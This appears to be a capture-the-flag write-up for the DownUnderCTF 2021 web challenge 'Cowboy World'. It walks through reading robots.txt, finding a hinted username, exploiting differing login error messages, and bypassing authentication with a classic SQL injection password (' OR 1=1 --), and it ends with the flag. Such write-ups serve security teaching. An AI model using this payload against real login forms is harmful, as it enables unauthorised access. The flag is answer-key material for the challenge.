# Cowboy World

- **Category:** Web

## Challenge

I heard this is the coolest site for cowboys and can you find a way in?

Author: Crem
https://web-cowboy-world-54f063db.chal-2021.duc.tf

Hint: https://www.youtube.com/watch?v=fn3KWM1kuAw

## Solution

Visit `/robot.txt`

```
# pls no look

User-Agent: regular_cowboys
Disallow: /sad.eml
```

Visit `/sad.eml`

```
Everyone says 'yeee hawwwww'

but never 'hawwwww yeee'

:'(

thats why a 'sadcowboy' is only allowed to go into our website
```

Username: `sadcowboy`

Entering wrong user and password give the error `Incorrect username or password`
Entering `sadcowboy` gives the error `Incorrect password`

Try SQLi
username: `sadcowboy`
password: `zzz' OR 1=1 --`

```
Welcome fellow sadcowboy *tips hat*

DUCTF{haww_yeeee_downunderctf?}
```

Flag

```
DUCTF{haww_yeeee_downunderctf?}
```
